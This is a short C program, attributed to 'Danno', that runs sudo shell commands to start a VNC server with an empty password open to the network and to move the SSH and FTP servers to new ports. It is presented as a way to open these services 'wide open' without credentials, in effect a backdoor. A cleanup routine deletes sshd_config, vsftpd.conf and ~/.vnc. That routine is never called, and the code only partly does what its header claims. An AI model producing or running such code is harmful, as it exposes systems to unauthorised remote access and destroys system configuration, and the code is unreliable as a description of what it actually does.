//
//  Little piece of fun that opens new VNC, SSH, FTP servers wide open.
//  No Credentials required to connect
//  Attempts to delete altered configs on service stop/timeout
//
//  by. Danno


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>

void startVNCServer(int vncPort) {
    char vncServerCommand[256];
    snprintf(vncServerCommand, sizeof(vncServerCommand), "vncserver -localhost no -geometry 1024x768 -passwd '' -rfbport %d &", vncPort);
    system(vncServerCommand);
}

void startSSHServer(int sshPort) {
    char sshConfigCommand[256];
    snprintf(sshConfigCommand, sizeof(sshConfigCommand), "sudo sed -i 's/#Port 22/Port %d/' /etc/ssh/sshd_config", sshPort);
    system(sshConfigCommand);
    char sshServerCommand[128];
    snprintf(sshServerCommand, sizeof(sshServerCommand), "sudo service ssh restart");
    system(sshServerCommand);
}

void startFTPServer(int ftpPort) {
    char ftpConfigCommand[256];
    snprintf(ftpConfigCommand, sizeof(ftpConfigCommand), "sudo sed -i 's/^#*\(listen_port=\)21$/\1%d/' /etc/vsftpd.conf", ftpPort);
    system(ftpConfigCommand);
    char ftpServerCommand[128];
    snprintf(ftpServerCommand, sizeof(ftpServerCommand), "sudo service vsftpd restart");
    system(ftpServerCommand);
}

void stopAndDeleteServices() {
    system("vncserver -kill :1");
    system("sudo service ssh stop");
    system("sudo service vsftpd stop");
    system("sudo rm -rf ~/.vnc");
    system("sudo rm -f /etc/ssh/sshd_config");
    system("sudo rm -f /etc/vsftpd.conf");
}

int main() {
    int vncPort = 5900;
    int sshPort = 2222;
    int ftpPort = 2121;
    
    startVNCServer(vncPort);
    startSSHServer(sshPort);
    startFTPServer(ftpPort);

    alarm(3600);

    while (1) {
        sleep(3600);
    }

    return 0;
}

